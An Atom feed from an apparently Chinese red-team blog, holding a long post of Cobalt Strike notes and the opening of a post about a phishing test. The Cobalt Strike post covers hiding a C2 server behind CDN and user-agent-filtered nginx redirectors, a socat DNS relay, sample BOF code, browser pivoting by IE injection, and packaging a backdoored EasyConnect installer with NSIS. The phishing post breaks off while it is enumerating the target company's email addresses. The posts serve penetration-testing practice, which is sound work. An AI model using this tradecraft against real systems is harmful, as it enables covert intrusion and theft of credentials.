<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chriskalix.github.io</id>
    <title>chriskali&apos;s blog</title>
    <updated>2020-10-20T15:40:06.491Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chriskalix.github.io"/>
    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
    <subtitle>Keep learning</subtitle>
    <logo>https://chriskalix.github.io/images/avatar.png</logo>
    <icon>https://chriskalix.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[CobaltStrike实操]]></title>
        <id>https://chriskalix.github.io/post/cobaltstrike/</id>
        <link href="https://chriskalix.github.io/post/cobaltstrike/">
        </link>
        <updated>2020-10-20T13:49:40.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>开始日期：2020-08-14<br>
cs版本：4.1<br>
作者：chriskali</p>
</blockquote>
<p>本文参考无数作者文章，以及Ateam大佬们翻译的cs中文版，不胜感激。同时今天又看到了zer0yu师傅的<a href="https://github.com/zer0yu/Awesome-CobaltStrike">Awesome-cobaltstrike</a>，一个不错的项目。<br>
当然了，在官网上有<a href="https://www.cobaltstrike.com/training">cobaltstrike教程</a>的免费视频，作为英语练习以及cobaltstrike学习是一个不错的选择。这次的实战篇幅和上回的内网渗透入门小记有相似之处，以记录学习为主。会从我有限的实际运用角度开展，对于感兴趣的部分进行扩展和深入。希望能对于文中不当或者理解错误的地方斧正，感谢~</p>
<blockquote>
<p>另外的感触是，工具只是实现攻击的一种方式，我们还是要对原理性上的东西进行学习和操作</p>
</blockquote>
<h2 id="0x01-起手式">0x01 起手式</h2>
<blockquote>
<p>cobaltstrike裸跑会有一定的风险，上手之前要手工做一些预先处理</p>
</blockquote>
<p>注册的邮箱均为protonmail，域名由namesilo购买，cdn前置为cloudflare，访问均挂代理。当然机器也最好挂国外，由于本人偷懒...<br>
先放一张简单的框架-工作</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1603201890709.png" alt="" loading="lazy"></figure>
<p>这是我的特困版本，其实雪姐有更好的版本，这里是雪姐的</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1603201907368.png" alt="" loading="lazy"></figure>
<p>当你的cs服务器未作加固，并且使用了默认的malleable c2，会有很多的特征指纹暴露在公网，下面是作者的图片</p>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1603201954067.png" alt="" loading="lazy"></figure>
<p>以及作者的建议</p>
<figure data-type="image" tabindex="4"><img src="https://chriskalix.github.io/post-images/1603201981392.png" alt="" loading="lazy"></figure>
<h3 id="证书生成">证书生成</h3>
<blockquote>
<p>默认配置导致keystore文件内容特征明显，容易被识别，首先先要对证书进行重新生成上线。<br>
<strong>注</strong>：这里的证书其实只是登录时候使用的证书，不是拿来回连时候使用的证书</p>
</blockquote>
<p>先看一下的keystore的特征值</p>
<figure data-type="image" tabindex="5"><img src="https://chriskalix.github.io/post-images/1603201994902.png" alt="" loading="lazy"></figure>
<p><code>Owner</code> 和 <code>Issuer</code> 的特征很明显，固定值。我的方法是直接修改teamserver的值，然后删除原先的cobaltstrike.store即可，替换关键字为如下值</p>
<pre><code class="language-bash">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=051, OU=SSL-RSA, O=Baidu, L=Beijing, ST=Baidu, C=CN&quot;
</code></pre>
<p>到这里，我以为我修改完了，直到看到dm师傅的<a href="https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ">文章</a>......<br>
还行，看到了悔过就不算迟。这里修改完后，其实是teamserver连接的时候用到的证书，不是https上线的时候的证书（这也太惊喜了）。上线过后的证书还是有明显的指纹特征，从dm师傅的文章中copy一下fofa的规则</p>
<pre><code>cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;
</code></pre>
<p>这里先提一嘴，后面肯定要自己动手去搞malleable-c2配置证书<br>
里面有一句经典话语，我们就按照这个搭建起来...<br>
<img src="https://chriskalix.github.io/post-images/1603202023214.png" alt="" loading="lazy"></p>
<h3 id="监听修改">监听修改</h3>
<p>默认的50050端口直接在teamserver里面就能进行修改（修改port即可）。<br>
但是暴露在公网上会有明显的指纹特征被识别，所以比较好的方法是监听在本地，然后再走隧道进行访问。我的方法是监听后在云服务器上配置安全组，禁止端口访问，再通过ssh隧道进行访问。但是如果要多人作战就不大行，毕竟直接给ssh密钥也不好<br>
其实这么修改之后呢，上面的ssl我都觉得可以不用了，反正得拨到内网里再搞</p>
<h3 id="malleable-c2">Malleable - C2</h3>
<blockquote>
<p>参考项目：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">官方demo</a>，<a href="https://www.cobaltstrike.com/help-malleable-c2">官方文档</a></p>
</blockquote>
<p>如果直接用demo的，肯定是被抓得死死的...所以我们需要有一些改动，或者寻找新奇的~在逛了一圈demo后，发现各色都有，模拟bing的，模拟gmail的形形色色。当然觉得比较通用的，还是看到先知的<a href="https://xz.aliyun.com/t/2796">这篇文章</a>，其中提到的<a href="https://github.com/threatexpress/malleable-c2">模拟jquery的项目</a>看样子还是比较通用实惠的...<br>
项目挺好的，就是一时间暂时理解不了这么多参数，对理解的参数稍作修改后使用<code>./c2lint c2.profile</code>命令做一下预认证检查......这个我觉得比较经典，不知道被加到规则里面了没有，暂时先使用吧~<br>
启用的命令为<code>nohup ./teamserver ipaddress password ./c2.profile&amp;</code> ，或者开到一个<code>screen</code>里面也可以</p>
<blockquote>
<p>20200826，我用了jquery的模板，但是cdn上线后命令执行有问题（PS：应该是我自己设置的不对），后来看到<a href="https://mp.weixin.qq.com/s/rBF7HPaV9IAVKlzaWV-9WA">文章</a>后转移到这种方法上，命令回显成功</p>
<p>但是我也发现了，Malleable C2能自定义的东西太多了，掌握了整个Malleable C2相当于对cobaltstrike本身就有了极大的理解。所以我决定还是慢慢来...后续再为这里做补充</p>
</blockquote>
<p><strong>注</strong>：为了保持猥琐，我在前端转发的nginx里指定了user-agent，当user-agent不是c2.profile里写的user-agent时，会重定向至百度。当然还可以使用或者增加别的判断方法，下面为示例</p>
<pre><code class="language-lua">server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
        index index.html index.htm index.nginx-debian.html;
        server_name 你的域名;
        location / {
                if ($http_user_agent != &quot;指定User-Agent&quot;) {
                        #try_files $uri $uri/ @c2;
                        rewrite ^/(.*) http://www.baidu.com/$1 permanent;
                }
                try_files $uri $uri/ @c2;
                #rewrite ^/(.*) http://www.baidu.com/$1 permanent;
        }
        location @c2 {
                proxy_pass http://后端的IP以及端口;
                proxy_redirect off;
                proxy_ssl_verify off;
                proxy_set_header Host $host;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
}
</code></pre>
<p>作者自己的<a href="https://www.bilibili.com/video/BV1jC4y1b7pK?p=3">第三节课</a>其实讲的非常好，我看了之后没有笔记，惭愧...</p>
<h3 id="cdn匿名">CDN匿名</h3>
<p>文章很多，不做搬运工。这次搭建用的是Cloudflare<br>
（<strong>20201002更新</strong>：CloudFlare的HTTP和HTTPS端口是有限制的，下面为限制的列表）</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>支持端口</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP</td>
<td>80，8080，8880，2052，2082，2086，2095</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443，2053，2083，2087，2096，8443</td>
</tr>
</tbody>
</table>
<p>有一个问题就是CF在国内的上线不稳定。不过这是一个demo版本，其实可以用aliyun的（就是需要备案...）最重要的就是配置的各个地方编写</p>
<figure data-type="image" tabindex="6"><img src="https://chriskalix.github.io/post-images/1603202047508.png" alt="" loading="lazy"></figure>
<p>这里的Host Header应该可以在profile里指定，这里没有直接做指定，需要重新填写，上述这个是HTTP的。需要再次提醒的是，十分不稳定，国外机器应该还可以，国内的不建议通过这种方式上线<br>
当然也有一个比较好的博文 - <a href="https://mp.weixin.qq.com/s/rBF7HPaV9IAVKlzaWV-9WA">链接</a>。提醒了我要关闭缓存，文中提到的开发者模式会一段时间后关闭（几个小时内），所以在CF上设置一下Bypass也可以（<a href="https://www.ljchen.com/archives/1087">文章链接</a>）</p>
<p>顺带说一下，国内的做上线可以直接用，若不想开放多个端口，则需要重写前置的nginx转发，我写了一个简单的demo做判断，如下所示。写的很简单，当然还是需要自己去做修改。</p>
<pre><code class="language-lua">server {
	listen 监听端口 default_server;
	listen [::]:监听端口 default_server;
	server_name 域名1 域名2;
	
	set $allow false;
	if ($http_user_agent != &quot;指定User-Agent&quot;) { #防止一些爬虫行为，指定特殊UA过滤大部分
		rewrite .* http://www.baidu.com/;
	}
	if ($host = 域名1) {
		set $allow true;
	}
	if ($host = 域名2) {
		set $allow true;
	}
	if ($allow = false) {
		rewrite .* http://www.baidu.com/;
	}

	set $port 80;
	if ($host = preview.code-jquery.net) {
		set $port 443;
	}
	location / {
		try_files $uri $uri/ @c2;
	}
        
	location @c2 {
                proxy_pass http://后端IP地址:$port;
                proxy_redirect off;
                proxy_ssl_verify off;
                proxy_set_header Host $host;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
}
</code></pre>
<h3 id="dns-beacon">DNS Beacon</h3>
<p>这个看起来花里胡哨的，网上配置很多。我讲一下自己的配置方法：<br>
首先指定一个A记录到自己的前置服务器。然后设定2-3个NS记录，指向到自己的A记录域名。为了不暴露后端的CS机器，DNS我们也采用UDP转发，在前置机器上开启监听：<br>
<code>socat -T 600 UDP4-LISTEN:53,reuseaddr,fork UDP4:主控机IP:5533</code><br>
把本机的监听到的数据包转移到后端机器上。但是dns-beacon有一个小问题，很容易掉线或者超时，这个就比较痛苦了。</p>
<figure data-type="image" tabindex="7"><img src="https://chriskalix.github.io/post-images/1603202066376.png" alt="" loading="lazy"></figure>
<p>这里我请教了群里的<strong>xq17</strong>师傅，可能是受到插件的影响，在下线插件之后就不会出现机器掉线再回来的情况了。（后来找到了，是Erebus的modules/auxiliary.cna插件中的heartbeat_5s判断了下线和预警，其实修改之后也可以继续正常使用的）<br>
另外听取建议后，DNS最好不要做大规模的文件传输或者网络操作，因为我看了一下每次只能252的字节传输，如果做大规模文件特征会非常明显。所以最好是用来做一些权限维持等...</p>
<p><strong>[*]</strong> : DNS beacon有多种模式，其中默认dns模式最慢，适合维持beacon。dns-txt速率较好，可以做一些数据传输，下图为模式以及其传输的速率：</p>
<figure data-type="image" tabindex="8"><img src="https://chriskalix.github.io/post-images/1603202076796.png" alt="" loading="lazy"></figure>
<h3 id="ssl-证书">SSL 证书</h3>
<p>根据这篇<a href="https://www.cnblogs.com/esofar/p/9291685.html">博文</a>可以快速配置，这里先偷个懒，暂时先用HTTP的<br>
（之前看到过雪姐的文章，过趋势的时候还是需要的，所以埋一个小坑，这个后面回头补上，应该挺简单的）</p>
<h3 id="端口限制-proxifier">端口限制 &amp; Proxifier</h3>
<p>之前说过不要直接把cobaltstrike登录放在公网，防止被记录或者标识。这里用到 <a href="https://github.com/gwuhaolin/lightsocks">lightsocks</a> 项目，当然功能类似的都可以的。假设后限制直接登录的端口，转而使用socks认证再使用proxifier登录。由于内网还做了别的服务，lightsocks的账号密码泄露后还是有被shell的风险，如果有个类似于隧道的就更好了...（<strong>[*] 20200910更新</strong>：作者视频里说了，他好些客户都是ssh打隧道过去的...看来我之前想的没有错，SSH自带又安全方便，我用了额外的项目想起来有点憨憨哈哈哈哈）<br>
当然服务开在公网，然后用iptables或者直接在云服务器上配置安全组都可以<br>
这里需要说一下proxifier，最好最好是设定单个程序为代理。我想着的宗旨是，后端cobaltstrike的IP无论如何不能出现和暴露，如果挂了全局，在本机渗透的时候暴露了IP岂不是很可惜......<br>
<strong>[*]</strong> 注：有能力或者团队的可以直接魔改cobaltstrike的源码，通过修改认证方式剔除指纹（...好羡慕），具体的可以搜索cobaltstrike二次开发关键字，后期慢慢补足吧~</p>
<h2 id="0x02-部分概念知识">0x02 部分概念&amp;知识</h2>
<blockquote>
<p>这里包括了一些红队或者Cobalt Strike自有的知识或者概念，作为学习，这里记录一下新的知识</p>
</blockquote>
<h3 id="stager-stageless">Stager &amp;&amp; Stageless</h3>
<blockquote>
<p>应该是cobaltstrike自有的知识点吧，做一下记录。Payload Stager即传输体</p>
</blockquote>
<p>先上一下cs作者讲解视频的截图<br>
<img src="https://chriskalix.github.io/post-images/1603202101370.png" alt="" loading="lazy"></p>
<p>稍微翻译一下图片中的内容：</p>
<ul>
<li><strong>Stager</strong>是一个从远程下载再执行payload的小程序，通常使用在对大小有限制的情况或者环境下</li>
<li><strong>Stageless</strong>即将payload直接打包，会比较大，但是不包含Stager</li>
<li><strong>Stagers</strong>更加不安全，脆弱，更加容易被检测到</li>
</ul>
<h3 id="域前置">域前置</h3>
<p>暂略</p>
<h3 id="spawn">Spawn</h3>
<h4 id="msf">Msf</h4>
<p>通常情况下，我们需要将cobaltstrike的payload派生到msf上，这里自己踩到了一个小坑，看了一下视频。需要先<br>
<code>set prependmigrate true 以及 set DisablePayloadHandler True</code><br>
不然功能回连有问题，附上作者的截图</p>
<figure data-type="image" tabindex="9"><img src="https://chriskalix.github.io/post-images/1603202120587.png" alt="" loading="lazy"></figure>
<h3 id="bofs">BOFs</h3>
<blockquote>
<p>BOFs是cobaltstrike 4.1 下的新的功能，官方链接<a href="https://www.cobaltstrike.com/help-beacon-object-files">如下</a>，在官方链接中已经对BOF有比较详细的解释，下面稍作翻译和学习</p>
</blockquote>
<blockquote>
<p>我认为这一部分非常有意思且实用，在github上搜索BOF关键字也已经有一些不错的项目，但是这一部分需要有win32和c开发的基础，对于我来说实现一些简单的功能也存在一定的难度（太菜了，列入长期的学习计划ing）</p>
</blockquote>
<h4 id="什么是bofs">什么是BOFs</h4>
<p>​		BOF(Beacon Object File)是一个已编译的C程序，按照一定的约定编写后，它可以在Beacon内执行并且调用Beacon内部的API。BOFs是一个能让Beacon拥有新的后渗透功能的方法</p>
<h4 id="bofs的优势">BOFs的优势</h4>
<p>​		C2平台的关键作用之一是提供外部的后渗透功能。Cobalt Strike 已经有能使用 Powershell，.NET，Reflective DLLs 的工具。这些工具依赖昂贵的OPSEC fork&amp;run模式，该模式包含对后渗透动作的进程创建和注入。并且BOF的痕迹更小，在Beacon内部执行，执行完毕后清除。<br>
​		BOF的提及很小。例如一个UAC bypass权限提升的反射型DLL实现的大小会超过100KB，但是如果使用BOF仅会小于3KB。如果在带宽有限制的情况（例如DNS隧道），那么会有巨大的提升。<br>
​		最后，BOFs的开发比较容易。你只需要Win32 的C编译器和一行命令。MinGW和Microsoft C编译器都可以生成BOF文件，不必为配置而大费周章。<br>
​		<strong>[*]</strong> ：我也找到了一篇讲的不错的<a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/">文章</a>，可以帮助我们更好的理解 BOF 的优劣和特点</p>
<h4 id="bof如何工作">BOF如何工作</h4>
<p>​		对于Beacon而言，一个BOF只是一段与位置无关的，接收指向Beacon内部指针的代码。<br>
​		对于Cobalt Strike，Beacon是由C编译的对象文件。Cobalt Strike解析这个文件，并且充当其内容的连接器和加载器。这个方法可以让你编写一段地址无关代码，在Beacon中使用并且动态调用Win32 APIs。</p>
<h4 id="bofs的劣势">BOFs的劣势</h4>
<p>​		BOFs是一个调用Win32 APIs和一些Beacon APIs的单文件C程序。不要期望以这种机制去连接其他功能或者构建大型项目。<br>
​		Cobalt Strike不会链接你的BOF到libc上，这意味着你仅能使用编译器的内部函数（例如Visual Studio中的memset -&gt; __stosb），公开的Beacon内部APIs，Win32 APIs以及自定义函数。所以由很多常见的函数（例如strlen，stcmp等等）将无法使用。<br>
​		BOFs在Beacon内部执行，如果BOF程序崩溃了，你将会失去你的Beacon。所以，写BOFs的时候请小心一点。<br>
​		CobaltStrike期望BOFs是一个运行时间短的单线程程序。BOFs会阻止Beacon的其他任务和执行。BOF没有异步或者长时间运行的模式，如果想要运行一个运行时间较长的，考虑使用<strong>反射DLL</strong></p>
<h4 id="如何开发bof">如何开发BOF</h4>
<blockquote>
<p>终于到了关键部分！到这里加一些自己的理解和笔记了</p>
</blockquote>
<p>打开IDE，写一个C程序，下面的Hello World的BOF：</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &quot;beacon.h&quot;

void go(char * args, int alen) {
      BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello World: %s&quot;, args);
}
</code></pre>
<p>下载<a href="https://www.cobaltstrike.com/downloads/beacon.h">beacon.h</a>（会用到的）<br>
在VS中，的编译语句：<br>
<strong>cl.exe /c /GS- hello.c /Fohello.o</strong><br>
在MinGW中的编译语句：<br>
<strong>x86_64-w64-mingw32-gcc -c hello.c -o hello.o</strong><br>
上述语句都会生成一个hello.o文件，用inline-execute语句在Beacon中执行，执行方法如下：<br>
<strong>beacon&gt; inline-execute /path/to/hello/o these are arguments</strong><br>
截个图，如下所示：</p>
<figure data-type="image" tabindex="10"><img src="https://chriskalix.github.io/post-images/1603202141298.png" alt="" loading="lazy"></figure>
<p>beacon.h定义了一些内部Beacon APIs。这个go函数，类似于C当中的main，这个函数被inline-execute调用并传参，BeaconOutput是一个将输出传给操作者的内部Beacon API，没什么特别的。</p>
<h4 id="动态函数解析">动态函数解析</h4>
<p>​		<code>GetProcAddress</code>，<code>LoadLibraryA</code>，<code>GetModuleHandle</code>，以及<code>FreeLibrary</code> 都可以在BOF文件中使用。你可以选择用这些函数去动态解析要调用的Win32 APIs。另外的一个选项是使用 Dynamic Function Resolution（DFR即动态函数解析）<br>
​		DRF是一个将Win32 APIs 申明和调用为 LIBRARY$Function 的约定。此约定为Beacon提供了显式解析特定函数所需的信息，并使其在运行前可用于您的BOF文件。当此过程失败时，Cobalt Strike将拒绝执行BOF，并告诉您它无法解析哪个函数。<br>
​		下面是一个BOF使用DFR查找当前域的示例：</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;dsgetdc.h&gt;
#include &quot;beacon.h&quot;

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
void go(char * args, int alen) {
	DWORD dwRet;
	PDOMAIN_CONTROLLER_INFO pdcInfo;
	dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &amp;pdcInfo);
	if (ERROR_SUCCESS == dwRet) {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;%s&quot;, pdcInfo-&gt;DomainName);
	}
	NETAPI32$NetApiBufferFree(pdcInfo);
}
</code></pre>
<p>​		上述代码使用DRF，从 <code>NETAPI32</code> 调用 <code>DsGetDcNameA</code> 和 <code>NetApiBufferFree</code>。当声明动态函数解析的函数原型时，请密切注意函数声明附带的修饰符。诸如WINAPI和 <code>DECLSPEC_IMPORT</code> 之类的关键字很重要。这些修饰为编译器提供了必要的提示，以传递参数并生成正确的调用指令。</p>
<h4 id="aggressor-script-和-bofs">Aggressor Script 和 BOFs</h4>
<p>​		BOF在Cobalt Strike中的最终应用可能才是最关键的。BOF是用来横向移动，权限提升或者侦察非常好的方法。<br>
​		<code>&amp;beacon_inline_execute</code> 函数是Aggressor Script运行BOF函数的入口点。下面是一个实例程序：</p>
<pre><code class="language-aggressor">alias hello {
	local('$barch $handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource(&quot;hello. $+ $barch $+ .o&quot;));
	$data   = readb($handle, -1);
	closef($handle);
	
	# pack our arguments
	$args   = bof_pack($1, &quot;zi&quot;, &quot;Hello World&quot;, 1234);
	
	# announce what we're doing
	btask($1, &quot;Running Hello BOF&quot;);
	
	# execute it.
	beacon_inline_execute($1, $data, &quot;demo&quot;, $args);
}
</code></pre>
<p>​		首先会找到该Beacon的架构，根据架构执行。<code>&amp;bof_pack</code> 函数将参数打包成 Beacon 内部数据解析 API 相兼容。脚本用 <code>&amp;btask</code> 记录 Beacon 所执行的操作，用 <code>&amp;beacon_inline_execute</code> 运行BOF。<br>
​		<code>&amp;beacon_inline_execute</code> 函数接收 Beacon ID 作为第一个参数，一串包含 BOF 内容的字符串作为第二个参数，入口点作为第三个参数，打包参数作为第四个参数。选择带有入口点的适用于组合类函数至单个BOF（这翻译的我也很困惑）</p>
<h3 id="external-c2">External C2</h3>
<blockquote>
<p>什么是External C2?为什么要External C2?简而言之，用户可以自定义通讯的方式，而不是固定的HTTP/HTTPS/SMB/DNS这种内置的通讯方式</p>
</blockquote>
<p>基本结构图</p>
<figure data-type="image" tabindex="11"><img src="https://chriskalix.github.io/post-images/1603202176172.png" alt="" loading="lazy"></figure>
<p>基本搜External C2都会看到这个图（我是在这个<a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/">博客</a>里看到的），这个图已经解释的比较清楚了，本地通过监听External C2 port，自实现的server段与Team Server通讯，client段通过命名管道，与Server段进行自定义通讯，其工作的内容和方式如下图所示（从这篇<a href="https://rcoil.me/2019/10/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E7%9A%84%20ExternalC2/">博客</a>里搬运而来）</p>
<figure data-type="image" tabindex="12"><img src="./ExternalC2.svg" alt="" loading="lazy"></figure>
<p>但是这个玩意的资料比较少，大部分都是大家写的几个demo，同样的还是给自己先挖个坑，后面会回过头来全部补上的。<br>
另外今天看到倾旋的<a href="https://github.com/Rvn0xsy/Cooolis-ms">Cooolis-ms</a>中也有用到了externalc2，不过好像没有写通信的加解密，但仍是一个很好的应用</p>
<h3 id="browser-piovting">Browser Piovting</h3>
<blockquote>
<p>该部分的功能为：让你挂一个代理，即可像在受害机上一样浏览网站。我认为使用场景为：拿下一台个人主机后，访问邮箱，OA等系统，而不用抓取密码再次登录等。当然，神奇的雪姐早就在博客里发过<a href="http://blog.leanote.com/post/snowming/4e07af1cab60">文章</a>了。</p>
</blockquote>
<p>这个功能刚开始认为非常好使，于是匆匆去测试发现好多并不能行，一番搜索后找到雪姐的博客开始看了起来...</p>
<figure data-type="image" tabindex="13"><img src="https://chriskalix.github.io/post-images/1603202279683.png" alt="" loading="lazy"></figure>
<h4 id="实现原理">实现原理</h4>
<blockquote>
<p>这一部分为了理解，照着雪姐的博客我看了一遍</p>
</blockquote>
<p>于socks代理不同，socks代理仅使用客户端作为代理，无法使用客户端已有的凭据。</p>
<ol>
<li>进程注入：这个就是为什么在点击Brower Pivot后会让我们先选择进程，选择后会向目标进程注入一个 agent</li>
<li>服务器上创建代理，请求代理的时候会转变成agent的请求</li>
<li>agent转化将请求转化为 <code>WinINet</code> 库的 API 调用。（雪姐的博客里对这个讲的更加详细，实现的原理也是主要依赖 WinINet 这个库，但是这方面我不了解，就不做搬运工了）</li>
<li><strong>关键</strong>：为什么不能注入 Edge，Chrome等，只能注入 IE 呢？因为 IE 浏览器用于 web 通信也是使用WinINet进行身份认证管理。</li>
</ol>
<h4 id="局限性使用">局限性&amp;使用</h4>
<blockquote>
<p>我认为这个只能用于一些比较特殊的场景。对方使用 IE 浏览器，且存在 IE 进程。唯一的优势是若存在这样的场景，可以避免二次登录。</p>
</blockquote>
<p>使用：注入 IE 浏览器的 x86 进程，一般情况下可以注入的进程 cobaltstrike 会在后面 ✔</p>
<h3 id="权限提升">权限提升</h3>
<blockquote>
<p>这一部分在 内网渗透入门 篇章中以及提及过一小部分，这里主要是记录和学习作者视频中的内容</p>
</blockquote>
<p>这里需要区分的是 Administrator 权限与 System权限。前者为管理员权限，后者为系统权限，在操作一些，如SAM时，需要以System权限运行。</p>
<figure data-type="image" tabindex="14"><img src="https://chriskalix.github.io/post-images/1603202288535.png" alt="" loading="lazy"></figure>
<p>如果需要使用其他脚本，可以使用 taowu 或者作者自己的 <a href="https://github.com/rsmudge/ElevateKit.git">ElevateKit</a>，以及作者推荐的PowerUp</p>
<h1 id="额外篇之蓝队反制">额外篇之蓝队反制</h1>
<blockquote>
<p>额外加餐</p>
</blockquote>
<h2 id="手动构造安装包">手动构造安装包</h2>
<blockquote>
<p>操作的 handbook 均来自<a href="https://mp.weixin.qq.com/s/LNQXs3Aq_9xyVQPK60xxaw">零队文章</a>，但是在实际构造和实践的时候还是踩坑了，赶紧记录，防止二次踩坑</p>
</blockquote>
<h3 id="准备材料">准备材料</h3>
<ol>
<li>DLL注入工具（拿破轮胎）</li>
<li>NSIS</li>
<li>EasyConnect（或者其他安装程序）</li>
</ol>
<p>**[*] 不足点：**由于原理上的理解和实践还不够，DLL注入工具只能先用现成的，shellcode也是没有混淆的。如果后续不能免杀了，应该修改cobaltstrike源码的shellcode（现成文章的有xor简单混淆一下），然后自己实现DLL注入，这是这次实践中自己发现的不足点。在写完这一篇后我会</p>
<h3 id="开始动手">开始动手</h3>
<ol>
<li>首先，安装完毕EasyConnect，不用任何操作，安装就行</li>
<li>用cobaltstrike的C payload，使用DLL注入工具生成一个 <code>wwwcomw.dll</code> 和 <code>conf.inf</code></li>
<li>将两个文件放置到执行的目录下，例如 easyConnect执行的客户端文件实际在  <code>C:\Program Files\Sangfor\SSL\SangforCSClient</code> （我的主机上是这样的）。然后使用DLL注入工具劫持执行的exe文件，easyconnect为<code>SangforCSClient.exe</code> 。</li>
<li>作为测试，直接双击启动发现成功上线，代表成功<br>
<strong>------------- 准备打包------------</strong></li>
<li>打包工具是NSIS，零队这里跳过了，其实我踩的坑都在这里5555<br>
第一步选择可视化脚本编辑器</li>
</ol>
<figure data-type="image" tabindex="15"><img src="https://chriskalix.github.io/post-images/1603202301339.png" alt="" loading="lazy"></figure>
<p>​		选择 使用脚本想到创建新的脚本文件</p>
<figure data-type="image" tabindex="16"><img src="https://chriskalix.github.io/post-images/1603202310773.png" alt="" loading="lazy"></figure>
<p>​		这里需要修改程序名称以及版本等等，这些信息会在安装的时候出现，所以不要乱填（这里版本是乱填的）</p>
<figure data-type="image" tabindex="17"><img src="https://chriskalix.github.io/post-images/1603202352491.png" alt="" loading="lazy"></figure>
<p>​		修改掉ico，这个是安装程序的ico</p>
<figure data-type="image" tabindex="18"><img src="https://chriskalix.github.io/post-images/1603202366245.png" alt="" loading="lazy"></figure>
<p>​			继续下一步，做图中内容的修改</p>
<figure data-type="image" tabindex="19"><img src="https://chriskalix.github.io/post-images/1603202375644.png" alt="" loading="lazy"></figure>
<p>​		修改目录，包含所有文件</p>
<figure data-type="image" tabindex="20"><img src="https://chriskalix.github.io/post-images/1603202403213.png" alt="" loading="lazy"></figure>
<p>​			这里就是坑点了，虽然说这里有添加快捷方式，但是我自己是添加不上的（暂时不知道原因），这也是导致我花费了比较多时间的			原因</p>
<figure data-type="image" tabindex="21"><img src="https://chriskalix.github.io/post-images/1603202418754.png" alt="" loading="lazy"></figure>
<p>​		之后就一直下一步，我们看到脚本，这里有我们需要修改的地方（快捷方式）</p>
<figure data-type="image" tabindex="22"><img src="https://chriskalix.github.io/post-images/1603202425983.png" alt="" loading="lazy"></figure>
<p>​		这里我们需要修改二个地方，1为起始位置，2是目标<br>
​		设置起始位置的语法为：<code>SetOutPath &quot;$INSTDIR&quot;</code>，但是这里默认的是安装的目录，查看完原本的EasyConnect文件，修改为 <code>SetOutPath $INSTDIR\SSL\SangforCSClient</code><br>
​		创建目标的语法为：<code>CreateShortCut $Desktop\EasyConnect.lnk $INSTDIR\...自己填.exe &quot;/要执行的命令&quot;</code>按照这个模板，直接填写即可，填写完毕后F9编译加运行，完毕后弹出740错误没关系，因为你权限不够。自己手动点开有UAC，安装后双击即可上线</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一次钓鱼测试]]></title>
        <id>https://chriskalix.github.io/post/bKTmLyJeL/</id>
        <link href="https://chriskalix.github.io/post/bKTmLyJeL/">
        </link>
        <updated>2020-09-29T16:13:11.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>记得去年差不多也是这个时候，和同事配合了一次钓鱼，最后因为payload有些错误加上他的离职，这个事情也就匆匆告一段落了（说起来还有点怀念并肩作战的日子）。如今又有了钓鱼的需求，于是记录一下这次从外网打点开始的钓鱼之旅。</p>
</blockquote>
<h2 id="目标制定">目标制定</h2>
<p>通过钓鱼手法，获取目标机器的敏感权限和身份信息。最后有时间/精力的话，稍微坐下横向和驻留。</p>
<h2 id="外网打点">外网打点</h2>
<blockquote>
<p>打点的目标非常明确，即为目标企业的mail网站以及邮箱信息</p>
</blockquote>
<h3 id="邮件用户名格式">邮件用户名格式</h3>
<blockquote>
<p>不能盲目冲锋，首先要获取到用户名的格式</p>
</blockquote>
<p>可以用现成的工具 theharvester，或者github等等等等。酒仙桥六号作战部队有个很好的<a href="https://mp.weixin.qq.com/s/07XwcNEJbLCaWUyhvGFFKw">文章</a>，里面有很多大范围搜集的姿势。<br>
当然大范围搜集有时候是一件非常方便的事情，往往在初步的收集后即可进行投递，但是当前的目标并非如此。用工具我们得出了一个初步的结果<br>
<img src="./format.png" alt="" loading="lazy"></p>
<p>是用 <code>员工姓名拼音@xxx.com</code> 这样的格式</p>
<h3 id="初步邮箱获取">初步邮箱获取</h3>
<blockquote>
<p>获取员工邮箱有许多地方，包括不限于泄露，爆破（smtps，web），其余后台信息等等，但是作为最快的方式，还是直接去找邮件系统</p>
</blockquote>
<p>由于前期的子域名搜集，很快发现该公司的邮件域名为 <code>mail.xxx.com</code>（太简单了）,访问后如下</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1601396736035.png" alt="" loading="lazy"></figure>
